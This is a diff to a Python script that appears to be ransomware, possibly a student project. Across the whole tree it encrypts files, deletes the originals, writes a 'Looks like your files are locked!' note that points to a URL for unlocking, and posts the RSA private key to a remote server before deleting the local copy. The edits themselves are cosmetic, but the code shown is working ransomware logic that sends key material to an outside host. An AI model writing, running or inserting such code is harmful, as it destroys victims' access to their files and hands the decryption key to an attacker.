@@ -11,7 +11,7 @@ from src import MyEncrypt, constants
 
 
 def genRSAKey():
-    print("Generating RSA Keys")
+    print("Generating RSA Keys...")
     privateKey = rsa.generate_private_key(
         public_exponent=constants.PUBLIC_EXPONENT,
         key_size=constants.RSA_KEY_LENGTH,
@@ -89,14 +89,14 @@ for root, dirs, files in os.walk("."):
             # Delete the original file
             os.remove(filePath)
 
-            print("Results of encryption stored at: " + jsonFileName)
-            print("")
+            #  print("Results of encryption stored at: " + jsonFileName)
+            #  print("")
 
 readMeFile = open(constants.README_FILE_PATH, "w")
 privateKeyFile = open(constants.PRIVATE_KEY_FILE_PATH)
 publicKeyFile = open(constants.PUBLIC_KEY_FILE_PATH)
 
-readMeFile.write("Looks like your files are locked!")
+readMeFile.write("Looks like your files are locked!\n")
 readMeFile.write("You'll have to go to https://jaydensdisciples.me in order to unlock them :P")
 readMeFile.close()
 
@@ -120,12 +120,16 @@ key_dict["public_key"] = publicKeyContents
 
 #  print(key_dict)
 
+print("Sending keys to server...")
 request = server_url + "/keys"
 
 response = requests.post(request, headers=headers, json=key_dict)
 
-print(response.status_code)
-print(response.reason)
-print(response.text)
+if (response.status_code != 200):
+    print(response.status_code)
+    print(response.reason)
+    print(response.text)
 
 os.remove(constants.PRIVATE_KEY_FILE_PATH)
+
+print("\nEncryption complete!")
